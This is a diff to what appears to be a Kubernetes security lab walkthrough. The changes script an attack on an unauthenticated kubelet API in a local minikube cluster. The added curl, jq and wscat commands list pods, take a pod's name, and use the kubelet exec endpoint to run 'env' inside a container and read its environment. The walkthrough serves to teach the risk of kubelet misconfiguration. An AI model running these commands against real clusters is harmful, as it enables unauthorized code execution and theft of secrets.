@@ -32,16 +32,20 @@ kubectl get pods
 curl --insecure https://$(minikube ip):10250/pods | jq
 ```
 
-5. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`
+5. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`.  If you have jq installed, you can do:
+```
+POD_NAME=$(curl --insecure https://$(minikube ip):10250/pods | jq -r '.items[].metadata.name' | grep link-unshorten)
+```
 
 6. Now, we take that Pod name and run another curl command. Reading Pod data is interesting but we want to do some damage:
 ```
-curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://$(minikube ip):10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env&input=1&output=1&tty=1"
+curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://$(minikube ip):10250/exec/default/$POD_NAME/unshorten-api-container?command=env&input=1&output=1&tty=1"
+CRI_PATH=$(curl -s -k -i -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://$(minikube ip):10250/exec/default/$POD_NAME/unshorten-api-container?command=env&input=1&output=1&tty=1" | perl -ne 'print "$1\n" if /location:\s+(.*)$/')
 ```
 
 7. This opens a stream which we can access using [wscat](https://www.npmjs.com/package/wscat). Take note of the `location:` header as we will be using that value to read from the stream. You can install `wscat` using the link above. Once `wscat` is installed, run the following command:
 ```
-wscat -c "https://$(minikube ip):10250/cri/exec/<valueFrom302>" --no-check
+wscat -c "https://$(minikube ip):10250${CRI_PATH}" --no-check
 ```
     
 You can use cURL too:
